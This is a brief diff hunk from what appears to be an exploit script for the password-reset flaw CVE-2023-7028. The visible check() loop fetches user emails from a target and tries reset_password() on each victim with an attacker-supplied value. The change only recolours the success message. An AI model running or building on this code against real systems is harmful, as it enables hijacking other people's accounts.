@@ -79,7 +79,7 @@ def check(url,attacker,arg_domain):
     victims = get_user_email(url,arg_domain)
     for victim in victims:
         if reset_password(url,session,token,victim,attacker):
-            print("Disfound:{}Password_Reset_CVE_2023_7028".format(url))
+            print("\033[31mDisfound:{}Password_Reset_CVE_2023_7028\033[0m".format(url))
             break
 
 if __name__ == '__main__':
